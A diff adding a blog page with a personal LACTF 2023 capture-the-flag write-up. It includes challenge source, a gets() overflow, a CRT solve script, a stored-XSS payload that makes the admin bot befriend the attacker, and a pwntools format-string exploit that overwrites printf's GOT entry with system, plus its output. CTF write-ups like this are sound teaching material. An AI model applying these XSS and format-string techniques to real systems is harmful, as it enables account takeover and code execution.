@@ -1,0 +1,692 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>LACTF 2023 Write-Ups | Jax | Anger</title>
+<meta name=keywords content="ctf,LACTF,write-up,2023">
+<meta name=description content="My write-ups for LACTF 2023.">
+<meta name=author content="Jax">
+<link rel=canonical href=https://jaxd.dev/post/lactf2023/>
+<meta name=google-site-verification content="XYZabc">
+<meta name=yandex-verification content="XYZabc">
+<meta name=msvalidate.01 content="XYZabc">
+<link crossorigin=anonymous href=/assets/css/stylesheet.62aa25427797f8efd87301a5b69795dc50df2dbe79a5fba0648cc7bb8dbcd7c9.css integrity="sha256-YqolQneX+O/YcwGltpeV3FDfLb55pfugZIzHu42818k=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://jaxd.dev/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://jaxd.dev/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://jaxd.dev/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://jaxd.dev/apple-touch-icon>
+<link rel=mask-icon href=https://jaxd.dev/favicon.ico>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="LACTF 2023 Write-Ups">
+<meta property="og:description" content="My write-ups for LACTF 2023.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://jaxd.dev/post/lactf2023/"><meta property="og:image" content="https://jaxd.dev/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2023-02-14T06:59:00+00:00">
+<meta property="article:modified_time" content="2023-02-14T06:59:00+00:00"><meta property="og:site_name" content="Jax | Anger">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://jaxd.dev/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="LACTF 2023 Write-Ups">
+<meta name=twitter:description content="My write-ups for LACTF 2023.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://jaxd.dev/post/"},{"@type":"ListItem","position":3,"name":"LACTF 2023 Write-Ups","item":"https://jaxd.dev/post/lactf2023/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"LACTF 2023 Write-Ups","name":"LACTF 2023 Write-Ups","description":"My write-ups for LACTF 2023.","keywords":["ctf","LACTF","write-up","2023"],"articleBody":"Introduction Hello everyone! Sorry this write-up is a bit late; school has been rough and the homework plentiful. But I’m glad to get this out today, and I’m hoping to get another out next weekend.\nThe challenges this CTF had were fun, exciting, and a bit of a breath of fresh air compared to some of the usual tedious stuff we get (no shade intended). I hope you all enjoy the write-up, and please feel free to email me or send me a DM if you have any questions!\nGatekeep This one was a simple overflow caused by the function gets() so when the input is greater than s1[15] check() is bypassed and the flag is obtained.\ngatekeep.c\n#include #include #include #include #include  void print_flag() { char flag[256]; FILE* flagfile = fopen(\"flag.txt\", \"r\"); if (flagfile == NULL) { puts(\"Cannot read flag.txt.\"); } else { fgets(flag, 256, flagfile); flag[strcspn(flag, \"\\n\")] = '\\0'; puts(flag); } } int check(){ char input[15]; char pass[10]; int access = 0; // If my password is random, I can gatekeep my flag! :)  int data = open(\"/dev/urandom\", O_RDONLY); if (data  0) { printf(\"Can't access /dev/urandom.\\n\"); exit(1); } else { ssize_t result = read(data, pass, sizeof pass); if (result  0) { printf(\"Data not received from /dev/urandom\\n\"); exit(1); } } close(data); printf(\"Password:\\n\"); gets(input); if(strcmp(input, pass)) { printf(\"I swore that was the right password ...\\n\"); } else { access = 1; } if(access) { printf(\"Guess I couldn't gaslight you!\\n\"); print_flag(); } } int main(){ setbuf(stdout, NULL); printf(\"If I gaslight you enough, you won't be able to guess my password! :)\\n\"); check(); return 0; } Exploitation chinese-lazy-theorem-1 For some reason I had some trouble with this one, but it ended up being a lot simpler than I had previously thought. chinese-lazy-theorem-1.py\n#!/usr/local/bin/python3 from Crypto.Util.number import getPrime from Crypto.Random.random import randint p = getPrime(512) q = getPrime(512) n = p*q # greater than this target = randint(1, n) used_oracle = False print(p) print(q) print(\"To quote Pete Bancini, \\\"I'm tired.\\\"\") print(\"I'll answer one modulus question, that's it.\") while True: print(\"What do you want?\") print(\"1: Ask for a modulus\") print(\"2: Guess my number\") print(\"3: Exit\") response = input(\" \") if response == \"1\": if used_oracle: print(\"too lazy\") print() else: modulus = input(\"Type your modulus here: \") modulus = int(modulus) if modulus  0: print(\"something positive pls\") print() else: used_oracle = True print(target%modulus) print() elif response == \"2\": guess = input(\"Type your guess here: \") if int(guess) == target: with open(\"flag.txt\", \"r\") as f: print(f.readline()) else: print(\"nope\") exit() else: print(\"bye\") exit() To obtain the flag, you only have to make the modulus greater than the target p*q , then use that to get the flag. chinese-lazy-theorem-2 If you can find target % p and target % q you find target target % pq. But since the maximum target is p*q*2*3*5 it isn’t quite enough for us, so we have to try (target % pq) + i * pq  30 times.\nI did so with the following script; please excuse its grotesqueness.\nfrom pwn import * from sympy.ntheory.modular import crt with remote(\"lac.tf\", 31111) as r: p = int(r.readline(False)) q = int(r.readline(False)) r.sendline(b\"1\") r.readuntil(b\"Type your modulus here: \") r.sendline(str(p).encode()) x = int(r.readline(False)) r.sendline(b\"1\") r.readuntil(b\"Type your modulus here: \") r.sendline(str(q).encode()) y = int(r.readline(False)) a, b = crt([p,q],[x,y]) r.sendline(b\"2\") for i in range(30): r.readuntil(b\"Type your guess here: \") r.sendline(str(a+i*b).encode()) print(r.readline()) discord l34k This was probably my favorite challenge of the CTF. We are asked to gain access to a Discord server depicted in a picture of a widget, but the entire challenge was based on a link provided in the description.\nThe link provided in the description: https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186 \nAfter looking a bit into the Discord JSON API, I saw that the first ID provided in the link is that of the server, so using that first ID, I added it to the link used for widgets.\nhttps://discordapp.com/api/servers/1060030874722259057/widget.json\nThis provided us with a discord link with the challenge flag.\nMetaverse I’ll admit, I solved this one late. But it was solved, so that is all that matters.\nWe are provided with two links:\n https://metaverse.lac.tf/login https://admin-bot.lac.tf/metaverse (We can infer XSS since when these are provided, they usually are.)  and a file index.js\nconst express = require(\"express\"); const path = require(\"path\"); const fs = require(\"fs\"); const cookieParser = require(\"cookie-parser\"); const { v4: uuid } = require(\"uuid\"); const flag = process.env.FLAG; const port = parseInt(process.env.PORT) || 8080; const adminpw = process.env.ADMINPW || \"placeholder\"; const accounts = new Map(); accounts.set(\"admin\", { password: adminpw, displayName: flag, posts: [], friends: [], }); const posts = new Map(); const app = express(); let cleanup = []; setInterval(() = { const now = Date.now(); let i = cleanup.findIndex((x) = now  x[1]); if (i === -1) { i = cleanup.length; } for (let j = 0; j  i; j++) { const account = accounts.get(cleanup[i][0]); for (const post of account.posts) { posts.delete(post); } accounts.delete(cleanup[i][0]); } cleanup = cleanup.slice(i); }, 1000 * 60); function needsAuth(req, res, next) { if (!res.locals.user) { res.redirect(\"/login\"); } else { next(); } } app.use(cookieParser()); app.use(express.urlencoded({ extended: false })); app.use((req, res, next) = { res.locals.user = null; if (req.cookies.login) { const chunks = req.cookies.login.split(\":\"); if (chunks.length === 2 \u0026\u0026 accounts.has(chunks[0]) \u0026\u0026 accounts.get(chunks[0]).password === chunks[1]) { res.locals.user = chunks[0]; } } next(); }); // templating engines are for losers! const postTemplate = fs.readFileSync(path.join(__dirname, \"post.html\"), \"utf8\"); app.get(\"/post/:id\", (req, res) = { if (posts.has(req.params.id)) { res.type(\"text/html\").send(postTemplate.replace(\"$CONTENT\", () = posts.get(req.params.id))); } else { res.status(400).type(\"text/html\").send(postTemplate.replace(\"$CONTENT\", \"post not found :(\")); } }); app.get(\"/\", needsAuth); app.get(\"/login\", (req, res, next) = { if (res.locals.user) { res.redirect(\"/\"); } else { next(); } }); app.use(express.static(path.join(__dirname, \"static\"), { extensions: [\"html\"] })); app.post(\"/register\", (req, res) = { if (typeof req.body.username !== \"string\" || typeof req.body.password !== \"string\" || typeof req.body.displayName !== \"string\") { res.redirect(\"/login#\" + encodeURIComponent(\"Please metafill out all the metafields.\")); return; } const username = req.body.username.trim(); const password = req.body.password.trim(); const displayName = req.body.displayName.trim(); if (!/^[\\w]{3,32}$/.test(username) || !/^[-\\w !@#$%^\u0026*()+]{3,32}$/.test(password) || !/^[-\\w ]{3,64}/.test(displayName)) { res.redirect(\"/login#\" + encodeURIComponent(\"Invalid metavalues provided for metafields.\")); return; } if (accounts.has(username)) { res.redirect(\"/login#\" + encodeURIComponent(\"Metaaccount already metaexists.\")); return; } accounts.set(username, { password, displayName, posts: [], friends: [] }); cleanup.push([username, Date.now() + 1000 * 60 * 60 * 12]); res.cookie(\"login\", `${username}:${password}`, { httpOnly: true }); res.redirect(\"/\"); }); app.post(\"/login\", (req, res) = { if (typeof req.body.username !== \"string\" || typeof req.body.password !== \"string\") { res.redirect(\"/login#\" + encodeURIComponent(\"Please metafill out all the metafields.\")); return; } const username = req.body.username.trim(); const password = req.body.password.trim(); if (accounts.has(username) \u0026\u0026 accounts.get(username).password === password) { res.cookie(\"login\", `${username}:${password}`, { httpOnly: true }); res.redirect(\"/\"); } else { res.redirect(\"/login#\" + encodeURIComponent(\"Wrong metausername/metapassword.\")); } }); app.post(\"/friend\", needsAuth, (req, res) = { res.type(\"text/plain\"); const username = req.body.username.trim(); if (!accounts.has(username)) { res.status(400).send(\"Metauser doesn't metaexist\"); } else { const user = accounts.get(username); if (user.friends.includes(res.locals.user)) { res.status(400).send(\"Already metafriended\"); } else { user.friends.push(res.locals.user); res.status(200).send(\"ok\"); } } }); app.post(\"/post\", needsAuth, (req, res) = { res.type(\"text/plain\"); const id = uuid(); const content = req.body.content; if (typeof content !== \"string\" || content.length  1000 || content.length === 0) { res.status(400).send(\"Invalid metacontent\"); } else { const user = accounts.get(res.locals.user); posts.set(id, content); user.posts.push(id); res.send(id); } }); app.get(\"/posts\", needsAuth, (req, res) = { res.type(\"application/json\"); res.send( JSON.stringify( accounts.get(res.locals.user).posts.map((id) = { const content = posts.get(id); return { id, blurb: content.length  50 ? content : content.slice(0, 50) + \"...\", }; }) ) ); }); app.get(\"/friends\", needsAuth, (req, res) = { res.type(\"application/json\"); res.send( JSON.stringify( accounts .get(res.locals.user) .friends.filter((username) = accounts.has(username)) .map((username) = ({ username, displayName: accounts.get(username).displayName, })) ) ); }); app.listen(port, () = { console.log(`Listening on port ${port}`); }); index.html\nfetch(\"/friends\") .then((res) = res.json()) .then((friends) = { const list = document.getElementById(\"friendlist\"); if (friends.length === 0) { const ele = document.createElement(\"p\"); ele.innerText = \"you have none :(\"; list.appendChild(ele); } for (const f of friends) { const ele = document.createElement(\"p\"); ele.innerText = `${f.displayName}(${f.username})`; list.appendChild(ele); } }); We can see that the flag will be set as the name of the Administrator user. Names can be seen with the /friends endpoint, so using XSS, we can use a POST request to /friend and become “friends” with the administrator.\nExploit\nfetch('/friend',{ method:'POST', headers:{ \"Content-type\":'application/x-www-form-urlencoded' }, body:'username=admin' }) With only a fetch request, we can use the metapost feature and see that it is replacing $CONTENT in the post.html file.\nconst postTemplate = fs.readFileSync(path.join(__dirname, \"post.html\"), \"utf8\"); app.get(\"/post/:id\", (req, res) = { if (posts.has(req.params.id)) { res.type(\"text/html\").send(postTemplate.replace(\"$CONTENT\", () = posts.get(req.params.id))); } else { res.status(400).type(\"text/html\").send(postTemplate.replace(\"$CONTENT\", \"post not found :(\")); } }); It executed: Final Payload\nscript fetch('/friend',{ method:'POST', headers:{ \"Content-type\":'application/x-www-form-urlencoded' }, body:'username=test' }) /script  By making a metapost with this, we can send the admin bot to it and get the flag by refreshing the main page.\nrolling in the mud I’ll be honest; for a bit, I thought this was a Nancy Drew encoding for a bit. But it’s pig pen…\nDecrypting that got us:{eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni}dugip\nWith a little magic got us:lactf{rolling_and_rolling_and_rolling_until_the_pigs_go_home}\nGreek Cipher We are provided with:\nκςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ'ι ργσκ ιηγτ. οσμιδ{ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ'ι_θιπψ_ωπν._λγοο_ψοσωγκ_ς_τνθι_θσω.μπζερσιθ!}\nUsing https://tio.run with\nprint(''.join(sorted(set(input())))) ` Which I then used substitute on CyberChef Replacing each letter with its current English equivalent\nI then blasted it getting the flag:lactf{i_guess_using_many_greek_characters_didn't_stop_you._well_played_i_must_say.congrats!}\nrickroll This one we over-engineered the hell out of, to the point where it was just a bit extra.\n#include  int main_called = 0; int main(void) { if (main_called) { puts(\"nice try\"); return 1; } main_called = 1; setbuf(stdout, NULL); printf(\"Lyrics: \"); char buf[256]; fgets(buf, 256, stdin); printf(\"Never gonna give you up, never gonna let you down\\nNever gonna run around and \"); printf(buf); printf(\"Never gonna make you cry, never gonna say goodbye\\nNever gonna tell a lie and hurt you\\n\"); return 0; } I was rickrolled by a ctf, so you, the reader, must experience the same\nExploit\n#!/usr/bin/env python3 from pwn import * context.binary = elf = ELF('rickroll_patched') glibc = ELF('libc.so.6', checksec=False) def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], sys.argv[2] return remote(host, int(port)) def main(): p = get_process() payload = b'%82c%14$lln%191c%15$hhn%47c%16$hhnaaaabb%186c%17$hhn...%18$s....\\x18@@\\x00\\x00\\x00\\x00\\x00\\x19@@\\x00\\x00\\x00\\x00\\x00\\x1a@@\\x00\\x00\\x00\\x00\\x00' + p64(elf.sym.main_called) + p64(elf.got.fgets) p.sendlineafter(b'Lyrics: ', payload) fgets_addr = u64(p.recvuntil(b'....')[:-4].split(b'...')[1].ljust(8, b'\\0')) glibc.address = fgets_addr - glibc.sym.fgets log.info(f'Leaked fgets() address: {hex(fgets_addr)}') log.success(f'Glibc base address: {hex(glibc.address)}') system = glibc.sym.system to_write = system \u0026 0xff payload = ('%' + str(to_write) + 'c%14$hhn').ljust(16, '.').encode() to_write = (((system  8) \u0026 0xff) - to_write - payload[:16].count(b'.')) % 256 payload += ('%' + str(to_write) + 'c%15$hhn').ljust(16, '.').encode() to_write = (((system  16) \u0026 0xff) - 0x55 - to_write - payload[16:32].count(b'.')) % 256 payload += ('%' + str(to_write) + 'c%16$hhn').ljust(16, '.').encode() to_write = (256 - 0xd2 - to_write - payload[32:48].count(b'.')) % 256 payload += ('%' + str(to_write) + 'c%17$hhn').ljust(16, '.').encode() payload += p64(elf.got.printf) payload += p64(elf.got.printf + 1) payload += p64(elf.got.printf + 2) payload += p64(elf.sym.main_called) p.sendlineafter(b'Lyrics: ', payload) try: p.sendlineafter(b'sh: 1: Lyrics:: not found\\n', b'cat flag.txt') p.recvuntil(b'sh: 1: Never: not found\\nsh: 2: Never: not found\\n') log.success(p.recv().decode().strip()) except EOFError: p.close() glibc.address = 0 main() if __name__ == '__main__': main() When executed:\n$ python3 solve.py lac.tf 31135 [*] '/home/anger/hack/ctf/LACTF2023/rickroll/rickroll_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7fa4f94079c0 [+] Glibc base address: 0x7fa4f9396000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7f1ece3cf9c0 [+] Glibc base address: 0x7f1ece35e000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7f81dba5f9c0 [+] Glibc base address: 0x7f81db9ee000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7f3bdb53c9c0 [+] Glibc base address: 0x7f3bdb4cb000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7f0c5b7639c0 [+] Glibc base address: 0x7f0c5b6f2000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7effec44b9c0 [+] Glibc base address: 0x7effec3da000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7f438f0d29c0 [+] Glibc base address: 0x7f438f061000 [*] Closed connection to lac.tf port 31135 [+] Opening connection to lac.tf on port 31135: Done [*] Leaked fgets() address: 0x7fd7ca6789c0 [+] Glibc base address: 0x7fd7ca607000 [+] lactf{printf_gave_me_up_and_let_me_down} [*] Closed connection to lac.tf port 31135 Conclusion It was a fun CTF and I look forward to next years event. I would like to thank my new teammates at /bin/cat, we only had three people working on this event but still placed very high.\nNote: I would like to apologize for any inconsistent formatting. I’m still working on a better way to convert the markdown I make these posts in to the HTML/JS I use on this site. This is also my first personal write-up so I am working on making them better and more detailed.\n","wordCount":"2142","inLanguage":"en","datePublished":"2023-02-14T06:59:00Z","dateModified":"2023-02-14T06:59:00Z","author":{"@type":"Person","name":"Jax"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://jaxd.dev/post/lactf2023/"},"publisher":{"@type":"Organization","name":"Jax | Anger","logo":{"@type":"ImageObject","url":"https://jaxd.dev/favicon.ico"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://jaxd.dev accesskey=h title="Home (Alt + H)">
+<img src=https://jaxd.dev/apple-touch-icon.png alt aria-label=logo height=35>Home</a>
+<div class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</div>
+</div>
+<ul id=menu>
+<li>
+<a href=https://jaxd.dev/tags/ title=tags>
+<span>tags</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://jaxd.dev>Home</a>&nbsp;»&nbsp;<a href=https://jaxd.dev/post/>Posts</a></div>
+<h1 class=post-title>
+LACTF 2023 Write-Ups
+</h1>
+<div class=post-meta><span title="2023-02-14 06:59:00 +0000 UTC">February 14, 2023</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2142 words&nbsp;·&nbsp;Jax&nbsp;|&nbsp;<a href=https://github.com/anger/jaxd.dev/content/post/LACTF2023.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><nav id=TableOfContents>
+<ul>
+<li><a href=#introduction>Introduction</a></li>
+<li><a href=#gatekeep>Gatekeep</a></li>
+<li><a href=#chinese-lazy-theorem-1>chinese-lazy-theorem-1</a></li>
+<li><a href=#chinese-lazy-theorem-2>chinese-lazy-theorem-2</a></li>
+<li><a href=#discord-l34k>discord l34k</a></li>
+<li><a href=#metaverse>Metaverse</a></li>
+<li><a href=#rolling-in-the-mud>rolling in the mud</a></li>
+<li><a href=#greek-cipher>Greek Cipher</a></li>
+<li><a href=#rickroll>rickroll</a></li>
+<li><a href=#conclusion>Conclusion</a>
+<ul>
+<li><a href=#note>Note:</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</details>
+</div>
+<div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
+<p>Hello everyone! Sorry this write-up is a bit late; school has been rough and the homework plentiful. But I&rsquo;m glad to get this out today, and I&rsquo;m hoping to get another out next weekend.</p>
+<p>The challenges this CTF had were fun, exciting, and a bit of a breath of fresh air compared to some of the usual tedious stuff we get (no shade intended). I hope you all enjoy the write-up, and please feel free to email me or send me a DM if you have any questions!</p>
+<h2 id=gatekeep>Gatekeep<a hidden class=anchor aria-hidden=true href=#gatekeep>#</a></h2>
+<p>This one was a simple overflow caused by the function <code>gets()</code> so when the input is greater than <code>s1[15]</code> <code>check()</code> is bypassed and the flag is obtained.<br>
+<strong>gatekeep.c</strong></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=kt>void</span> <span class=nf>print_flag</span><span class=p>()</span> <span class=p>{</span>
+    <span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
+
+    <span class=n>FILE</span><span class=o>*</span> <span class=n>flagfile</span> <span class=o>=</span> <span class=n>fopen</span><span class=p>(</span><span class=s>&#34;flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
+    
+    <span class=k>if</span> <span class=p>(</span><span class=n>flagfile</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Cannot read flag.txt.&#34;</span><span class=p>);</span>
+    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+        <span class=n>fgets</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=mi>256</span><span class=p>,</span> <span class=n>flagfile</span><span class=p>);</span>
+        <span class=n>flag</span><span class=p>[</span><span class=n>strcspn</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+        <span class=n>puts</span><span class=p>(</span><span class=n>flag</span><span class=p>);</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>check</span><span class=p>(){</span>
+    <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>15</span><span class=p>];</span>
+    <span class=kt>char</span> <span class=n>pass</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
+    <span class=kt>int</span> <span class=n>access</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+
+    <span class=c1>// If my password is random, I can gatekeep my flag! :)
+</span><span class=c1></span>    <span class=kt>int</span> <span class=n>data</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
+    <span class=k>if</span> <span class=p>(</span><span class=n>data</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
+    <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Can&#39;t access /dev/urandom.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>else</span>
+    <span class=p>{</span>
+        <span class=n>ssize_t</span> <span class=n>result</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>pass</span><span class=p>,</span> <span class=k>sizeof</span> <span class=n>pass</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>result</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
+        <span class=p>{</span>
+            <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Data not received from /dev/urandom</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+            <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+    <span class=n>close</span><span class=p>(</span><span class=n>data</span><span class=p>);</span>
+    
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Password:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=n>gets</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
+
+    <span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=n>pass</span><span class=p>))</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;I swore that was the right password ...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=p>}</span>
+    <span class=k>else</span> <span class=p>{</span>
+        <span class=n>access</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+    <span class=p>}</span>
+
+    <span class=k>if</span><span class=p>(</span><span class=n>access</span><span class=p>)</span> <span class=p>{</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Guess I couldn&#39;t gaslight you!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=n>print_flag</span><span class=p>();</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
+    <span class=n>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;If I gaslight you enough, you won&#39;t be able to guess my password! :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=n>check</span><span class=p>();</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></div><p><strong>Exploitation</strong>
+<img loading=lazy src=https://i.imgur.com/biCdKCG.png alt>
+</p>
+<h2 id=chinese-lazy-theorem-1>chinese-lazy-theorem-1<a hidden class=anchor aria-hidden=true href=#chinese-lazy-theorem-1>#</a></h2>
+<p>For some reason I had some trouble with this one, but it ended up being a lot simpler than I had previously thought. 
+<strong>chinese-lazy-theorem-1.py</strong></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/local/bin/python3</span>
+
+<span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>getPrime</span>
+<span class=kn>from</span> <span class=nn>Crypto.Random.random</span> <span class=kn>import</span> <span class=n>randint</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>
+<span class=n>q</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>
+<span class=n>n</span> <span class=o>=</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span> <span class=c1># greater than this</span>
+
+<span class=n>target</span> <span class=o>=</span> <span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
+
+<span class=n>used_oracle</span> <span class=o>=</span> <span class=kc>False</span>
+
+<span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
+<span class=nb>print</span><span class=p>(</span><span class=n>q</span><span class=p>)</span>
+
+<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;To quote Pete Bancini, </span><span class=se>\&#34;</span><span class=s2>I&#39;m tired.</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>)</span>
